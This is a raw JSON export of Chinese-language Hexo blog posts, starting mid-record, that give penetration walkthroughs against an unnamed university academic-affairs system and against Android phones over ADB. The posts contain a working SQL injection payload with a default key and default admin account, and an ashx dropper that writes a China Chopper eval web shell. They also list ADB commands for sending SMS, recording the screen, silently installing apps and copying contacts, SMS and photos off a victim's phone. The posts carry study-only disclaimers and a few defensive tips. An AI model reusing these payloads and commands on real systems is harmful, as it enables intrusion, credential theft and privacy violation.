&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，<!--more-->土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。\n\n### 漏洞详情\n >今天的目标\n\n![](/images/pasted-45.png)\n\n >找到webservice接口，路径在service.asmx\n\n![](/images/pasted-46.png)\n\n>漏洞在于\n> * GetStuCheckinInfo\n>这个接口\n\n![](/images/pasted-47.png)\n\n> 我们只需要关注`xh`和 `strKey` 这两个节点就可以了。\n\n> 其中的strKey都是默认的`KKKGZ2312`\n\n> `Xh`这个节点就是我们的注入语句了。\n\npoc:\n```sql\n222222' union select \nNull,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null\n,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01\n```\n\n>yhb   用户表\n>yhm   用户名\n>kl    口令\n\n>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)\n\n>构造好语句开始注入\n\n![](/images/pasted-48.png)\n\n>可以看到jwc01用户的密码密文出来了。\n\n>我们拿去解密\n\n![](/images/pasted-49.png)\n\n>Ok可以登录了\n\n![](/images/pasted-50.png)\n\n>Bingo\n\n![](/images/pasted-51.png)\n\n>靓女多多，\n\n![](/images/pasted-52.png)\n\n\n### 总结\n> 不想让文章太长，getshell提权部分就放在下篇。\n> 后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。\n>再次提醒：\n> **文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**","slug":"diary-2017-0314-01","published":1,"updated":"2017-05-22T16:25:40.690Z","photos":[],"link":"","_id":"cjvhjxaao000biny22xj1s7l7","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，<a id=\"more\"></a>土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。</p>\n</blockquote>\n<h3 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h3><blockquote>\n<p>今天的目标</p>\n</blockquote>\n<p><img src=\"/images/pasted-45.png\" alt></p>\n<blockquote>\n<p>找到webservice接口，路径在service.asmx</p>\n</blockquote>\n<p><img src=\"/images/pasted-46.png\" alt></p>\n<blockquote>\n<p>漏洞在于</p>\n<ul>\n<li>GetStuCheckinInfo<br>这个接口</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/pasted-47.png\" alt></p>\n<blockquote>\n<p>我们只需要关注<code>xh</code>和 <code>strKey</code> 这两个节点就可以了。</p>\n</blockquote>\n<blockquote>\n<p>其中的strKey都是默认的<code>KKKGZ2312</code></p>\n</blockquote>\n<blockquote>\n<p><code>Xh</code>这个节点就是我们的注入语句了。</p>\n</blockquote>\n<p>poc:<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">222222' union <span class=\"keyword\">select</span> </span><br><span class=\"line\"><span class=\"literal\">Null</span>,kl,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span></span><br><span class=\"line\">,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span> <span class=\"keyword\">from</span> yhb <span class=\"keyword\">where</span> yhm=<span class=\"string\">'jwc01</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>yhb   用户表<br>yhm   用户名<br>kl    口令</p>\n</blockquote>\n<blockquote>\n<p>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)</p>\n</blockquote>\n<blockquote>\n<p>构造好语句开始注入</p>\n</blockquote>\n<p><img src=\"/images/pasted-48.png\" alt></p>\n<blockquote>\n<p>可以看到jwc01用户的密码密文出来了。</p>\n</blockquote>\n<blockquote>\n<p>我们拿去解密</p>\n</blockquote>\n<p><img src=\"/images/pasted-49.png\" alt></p>\n<blockquote>\n<p>Ok可以登录了</p>\n</blockquote>\n<p><img src=\"/images/pasted-50.png\" alt></p>\n<blockquote>\n<p>Bingo</p>\n</blockquote>\n<p><img src=\"/images/pasted-51.png\" alt></p>\n<blockquote>\n<p>靓女多多，</p>\n</blockquote>\n<p><img src=\"/images/pasted-52.png\" alt></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><blockquote>\n<p>不想让文章太长，getshell提权部分就放在下篇。<br>后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，","more":"土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。</p>\n</blockquote>\n<h3 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h3><blockquote>\n<p>今天的目标</p>\n</blockquote>\n<p><img src=\"/images/pasted-45.png\" alt></p>\n<blockquote>\n<p>找到webservice接口，路径在service.asmx</p>\n</blockquote>\n<p><img src=\"/images/pasted-46.png\" alt></p>\n<blockquote>\n<p>漏洞在于</p>\n<ul>\n<li>GetStuCheckinInfo<br>这个接口</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/pasted-47.png\" alt></p>\n<blockquote>\n<p>我们只需要关注<code>xh</code>和 <code>strKey</code> 这两个节点就可以了。</p>\n</blockquote>\n<blockquote>\n<p>其中的strKey都是默认的<code>KKKGZ2312</code></p>\n</blockquote>\n<blockquote>\n<p><code>Xh</code>这个节点就是我们的注入语句了。</p>\n</blockquote>\n<p>poc:<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">222222' union <span class=\"keyword\">select</span> </span><br><span class=\"line\"><span class=\"literal\">Null</span>,kl,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span></span><br><span class=\"line\">,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span>,<span class=\"literal\">Null</span> <span class=\"keyword\">from</span> yhb <span class=\"keyword\">where</span> yhm=<span class=\"string\">'jwc01</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>yhb   用户表<br>yhm   用户名<br>kl    口令</p>\n</blockquote>\n<blockquote>\n<p>表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01)</p>\n</blockquote>\n<blockquote>\n<p>构造好语句开始注入</p>\n</blockquote>\n<p><img src=\"/images/pasted-48.png\" alt></p>\n<blockquote>\n<p>可以看到jwc01用户的密码密文出来了。</p>\n</blockquote>\n<blockquote>\n<p>我们拿去解密</p>\n</blockquote>\n<p><img src=\"/images/pasted-49.png\" alt></p>\n<blockquote>\n<p>Ok可以登录了</p>\n</blockquote>\n<p><img src=\"/images/pasted-50.png\" alt></p>\n<blockquote>\n<p>Bingo</p>\n</blockquote>\n<p><img src=\"/images/pasted-51.png\" alt></p>\n<blockquote>\n<p>靓女多多，</p>\n</blockquote>\n<p><img src=\"/images/pasted-52.png\" alt></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><blockquote>\n<p>不想让文章太长，getshell提权部分就放在下篇。<br>后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。<br>再次提醒：<br><strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></p>\n</blockquote>"},{"layout":"post","title":"adb指令渗透手机获取隐私信息","date":"2017-03-17T03:00:20.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n>前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。<!--more-->\n>前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。\n\n#### 发送短信\n> 控制受害者手机发送短信，这个只需要三条命令就可以达到。<br/>\n>  打开了短信应用程序，当前焦点在文本框\n>  * adb shell am start -a android.intent.action.SENDTO -d sms:10086 --es sms_body \"hello\" --ez exit_on_sent true\n>  焦点去到发送按键\n>  * adb shell input keyevent 22  \n>  回车，就是按下发送键\n>  * adb shell input keyevent 66  \n\n>![](/images/pasted-45.jpg)\n\n#### 监视受害者手机\n> 对受害者手机屏幕录屏，然后从手机传输到电脑。<br/>\n> * adb shell screenrecord /sdcard/test.mp4\n> 录制完毕后再从手机传输到电脑中\n> * adb pull /sdcard/test.mp4 d:\\test.mp4\n> 其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。\n> * adb shell screenrecord --size 848x480 /sdcard/test.mp4\n\n>![](/images/pasted-46.jpg)\n\n#### 静默安装程序\n> 将恶意程序静默安装在受害者手机内。\n>  * adb install d:/test.apk\n> 打开启动程序\n>  * adb shell am start -n hk.myapplication/hk.myapplication.MainActivity\n> hk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径.\n\n>![](/images/pasted-47.jpg)\n\n#### 窃取通讯录短信等隐私。\n> 作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。\n> 我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。\n> 通讯录和通话记录的数据库存放在\n> `/data/data/com.android.providers.contacts/databases/contacts2.db`\n> 短信的数据库存放在\n> `/data/data/com.android.providers.telephony/databases/mmssms.db`\n> ps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。\n> 另外所有安卓手机中，我们手机拍摄的照片都会保存在`/sdcard/DCIM`这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。\n\n#### 末尾\n> 这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施\n> * 不要使用安全性未知的数据线连接自己的手机。\n> * 在非需要调试的情况下，不要开启adb调试。\n> * 安装可靠的手机杀毒软件。","source":"_posts/diary-2017-0317-01.md","raw":"---\nlayout: post\ntitle: adb指令渗透手机获取隐私信息\ndate: 2017-03-17 11:00:20\ncomments: true\ntags:\n\t- 安全攻防\n\t- 安卓\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n>前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。<!--more-->\n>前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。\n\n#### 发送短信\n> 控制受害者手机发送短信，这个只需要三条命令就可以达到。<br/>\n>  打开了短信应用程序，当前焦点在文本框\n>  * adb shell am start -a android.intent.action.SENDTO -d sms:10086 --es sms_body \"hello\" --ez exit_on_sent true\n>  焦点去到发送按键\n>  * adb shell input keyevent 22  \n>  回车，就是按下发送键\n>  * adb shell input keyevent 66  \n\n>![](/images/pasted-45.jpg)\n\n#### 监视受害者手机\n> 对受害者手机屏幕录屏，然后从手机传输到电脑。<br/>\n> * adb shell screenrecord /sdcard/test.mp4\n> 录制完毕后再从手机传输到电脑中\n> * adb pull /sdcard/test.mp4 d:\\test.mp4\n> 其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。\n> * adb shell screenrecord --size 848x480 /sdcard/test.mp4\n\n>![](/images/pasted-46.jpg)\n\n#### 静默安装程序\n> 将恶意程序静默安装在受害者手机内。\n>  * adb install d:/test.apk\n> 打开启动程序\n>  * adb shell am start -n hk.myapplication/hk.myapplication.MainActivity\n> hk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径.\n\n>![](/images/pasted-47.jpg)\n\n#### 窃取通讯录短信等隐私。\n> 作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。\n> 我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。\n> 通讯录和通话记录的数据库存放在\n> `/data/data/com.android.providers.contacts/databases/contacts2.db`\n> 短信的数据库存放在\n> `/data/data/com.android.providers.telephony/databases/mmssms.db`\n> ps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。\n> 另外所有安卓手机中，我们手机拍摄的照片都会保存在`/sdcard/DCIM`这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。\n\n#### 末尾\n> 这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施\n> * 不要使用安全性未知的数据线连接自己的手机。\n> * 在非需要调试的情况下，不要开启adb调试。\n> * 安装可靠的手机杀毒软件。","slug":"diary-2017-0317-01","published":1,"updated":"2017-03-21T02:16:22.789Z","photos":[],"link":"","_id":"cjvhjxaap000ciny2sk1qpl0o","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。<a id=\"more\"></a><br>前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。</p>\n</blockquote>\n<h4 id=\"发送短信\"><a href=\"#发送短信\" class=\"headerlink\" title=\"发送短信\"></a>发送短信</h4><blockquote>\n<p>控制受害者手机发送短信，这个只需要三条命令就可以达到。<br><br> 打开了短信应用程序，当前焦点在文本框</p>\n<ul>\n<li>adb shell am start -a android.intent.action.SENDTO -d sms:10086 –es sms_body “hello” –ez exit_on_sent true<br>焦点去到发送按键</li>\n<li>adb shell input keyevent 22<br>回车，就是按下发送键</li>\n<li>adb shell input keyevent 66  </li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-45.jpg\" alt></p>\n</blockquote>\n<h4 id=\"监视受害者手机\"><a href=\"#监视受害者手机\" class=\"headerlink\" title=\"监视受害者手机\"></a>监视受害者手机</h4><blockquote>\n<p>对受害者手机屏幕录屏，然后从手机传输到电脑。<br></p>\n<ul>\n<li>adb shell screenrecord /sdcard/test.mp4<br>录制完毕后再从手机传输到电脑中</li>\n<li>adb pull /sdcard/test.mp4 d:\\test.mp4<br>其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。</li>\n<li>adb shell screenrecord –size 848x480 /sdcard/test.mp4</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-46.jpg\" alt></p>\n</blockquote>\n<h4 id=\"静默安装程序\"><a href=\"#静默安装程序\" class=\"headerlink\" title=\"静默安装程序\"></a>静默安装程序</h4><blockquote>\n<p>将恶意程序静默安装在受害者手机内。</p>\n<ul>\n<li>adb install d:/test.apk<br>打开启动程序</li>\n<li>adb shell am start -n hk.myapplication/hk.myapplication.MainActivity<br>hk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径.</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-47.jpg\" alt></p>\n</blockquote>\n<h4 id=\"窃取通讯录短信等隐私。\"><a href=\"#窃取通讯录短信等隐私。\" class=\"headerlink\" title=\"窃取通讯录短信等隐私。\"></a>窃取通讯录短信等隐私。</h4><blockquote>\n<p>作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。<br>我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。<br>通讯录和通话记录的数据库存放在<br><code>/data/data/com.android.providers.contacts/databases/contacts2.db</code><br>短信的数据库存放在<br><code>/data/data/com.android.providers.telephony/databases/mmssms.db</code><br>ps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。<br>另外所有安卓手机中，我们手机拍摄的照片都会保存在<code>/sdcard/DCIM</code>这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。</p>\n</blockquote>\n<h4 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h4><blockquote>\n<p>这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施</p>\n<ul>\n<li>不要使用安全性未知的数据线连接自己的手机。</li>\n<li>在非需要调试的情况下，不要开启adb调试。</li>\n<li>安装可靠的手机杀毒软件。</li>\n</ul>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h3 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h3><blockquote>\n<p>前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。","more":"<br>前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。</p>\n</blockquote>\n<h4 id=\"发送短信\"><a href=\"#发送短信\" class=\"headerlink\" title=\"发送短信\"></a>发送短信</h4><blockquote>\n<p>控制受害者手机发送短信，这个只需要三条命令就可以达到。<br><br> 打开了短信应用程序，当前焦点在文本框</p>\n<ul>\n<li>adb shell am start -a android.intent.action.SENDTO -d sms:10086 –es sms_body “hello” –ez exit_on_sent true<br>焦点去到发送按键</li>\n<li>adb shell input keyevent 22<br>回车，就是按下发送键</li>\n<li>adb shell input keyevent 66  </li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-45.jpg\" alt></p>\n</blockquote>\n<h4 id=\"监视受害者手机\"><a href=\"#监视受害者手机\" class=\"headerlink\" title=\"监视受害者手机\"></a>监视受害者手机</h4><blockquote>\n<p>对受害者手机屏幕录屏，然后从手机传输到电脑。<br></p>\n<ul>\n<li>adb shell screenrecord /sdcard/test.mp4<br>录制完毕后再从手机传输到电脑中</li>\n<li>adb pull /sdcard/test.mp4 d:\\test.mp4<br>其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。</li>\n<li>adb shell screenrecord –size 848x480 /sdcard/test.mp4</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-46.jpg\" alt></p>\n</blockquote>\n<h4 id=\"静默安装程序\"><a href=\"#静默安装程序\" class=\"headerlink\" title=\"静默安装程序\"></a>静默安装程序</h4><blockquote>\n<p>将恶意程序静默安装在受害者手机内。</p>\n<ul>\n<li>adb install d:/test.apk<br>打开启动程序</li>\n<li>adb shell am start -n hk.myapplication/hk.myapplication.MainActivity<br>hk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径.</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-47.jpg\" alt></p>\n</blockquote>\n<h4 id=\"窃取通讯录短信等隐私。\"><a href=\"#窃取通讯录短信等隐私。\" class=\"headerlink\" title=\"窃取通讯录短信等隐私。\"></a>窃取通讯录短信等隐私。</h4><blockquote>\n<p>作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。<br>我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。<br>通讯录和通话记录的数据库存放在<br><code>/data/data/com.android.providers.contacts/databases/contacts2.db</code><br>短信的数据库存放在<br><code>/data/data/com.android.providers.telephony/databases/mmssms.db</code><br>ps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。<br>另外所有安卓手机中，我们手机拍摄的照片都会保存在<code>/sdcard/DCIM</code>这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。</p>\n</blockquote>\n<h4 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h4><blockquote>\n<p>这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施</p>\n<ul>\n<li>不要使用安全性未知的数据线连接自己的手机。</li>\n<li>在非需要调试的情况下，不要开启adb调试。</li>\n<li>安装可靠的手机杀毒软件。</li>\n</ul>\n</blockquote>"},{"layout":"post","title":"某教务系统注入getshell提权一条龙(下)","date":"2017-03-14T03:14:42.000Z","comments":1,"_content":"\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。<!--more-->\n\n### 漏洞详情\n>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传\n\n![](/images/pasted-53.PNG)\n\n![](/images/pasted-53.5.PNG)\n\n>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话\n\npoc:\n```C#\n<%@ WebHandler Language=\"C#\" Class=\"Handler\" %> \nusing System; \nusing System.Web; \nusing System.IO; \npublic class Handler : IHttpHandler { \n    public void ProcessRequest (HttpContext context) { \n        context.Response.ContentType = \"text/plain\"; \n        string show=\"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\\\"chopper\\\"],\\\"unsafe\\\");%>\"; \n        StreamWriter file1= File.CreateText(context.Server.MapPath(\"root.aspx\")); \n        file1.Write(show); \n        file1.Flush(); \n        file1.Close(); \n    } \n    public bool IsReusable { \n        get { \n            return false; \n        } \n    } \n} \n```\n\n>会上传在wbwj目录下\n\n>访问http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper\n\n>一句话地址，http://***.***.com/wbwj/root.aspx  连接之\n\n![](/images/pasted-54.PNG)\n\n>看下权限,还是挺大的，\n\n![](/images/pasted-55.PNG)\n\n![](/images/pasted-56.PNG)\n\n![](/images/pasted-57.PNG)\n\n> 直接上传神器提权之。\n\n![](/images/pasted-58.PNG)\n\n>3389端口没有改，直接连接。\n\n![](/images/pasted-59.PNG)\n\n![](/images/pasted-60.PNG)\n\n> 在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。\n\n![](/images/pasted-61.PNG)\n\n>在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码\n\n>![](/images/pasted-100.jpg)\n\n\n### 总结\n> 这个是什么教务系统就不多说，用过的一看就知道。\n> 有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。\n> 后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。\n>再次提醒：\n> **文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**","source":"_posts/diary-2017-0314-02.md","raw":"---\nlayout: post\ntitle: 某教务系统注入getshell提权一条龙(下)\ndate: 2017-03-14 11:14:42\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。<!--more-->\n\n### 漏洞详情\n>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传\n\n![](/images/pasted-53.PNG)\n\n![](/images/pasted-53.5.PNG)\n\n>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话\n\npoc:\n```C#\n<%@ WebHandler Language=\"C#\" Class=\"Handler\" %> \nusing System; \nusing System.Web; \nusing System.IO; \npublic class Handler : IHttpHandler { \n    public void ProcessRequest (HttpContext context) { \n        context.Response.ContentType = \"text/plain\"; \n        string show=\"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\\\"chopper\\\"],\\\"unsafe\\\");%>\"; \n        StreamWriter file1= File.CreateText(context.Server.MapPath(\"root.aspx\")); \n        file1.Write(show); \n        file1.Flush(); \n        file1.Close(); \n    } \n    public bool IsReusable { \n        get { \n            return false; \n        } \n    } \n} \n```\n\n>会上传在wbwj目录下\n\n>访问http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper\n\n>一句话地址，http://***.***.com/wbwj/root.aspx  连接之\n\n![](/images/pasted-54.PNG)\n\n>看下权限,还是挺大的，\n\n![](/images/pasted-55.PNG)\n\n![](/images/pasted-56.PNG)\n\n![](/images/pasted-57.PNG)\n\n> 直接上传神器提权之。\n\n![](/images/pasted-58.PNG)\n\n>3389端口没有改，直接连接。\n\n![](/images/pasted-59.PNG)\n\n![](/images/pasted-60.PNG)\n\n> 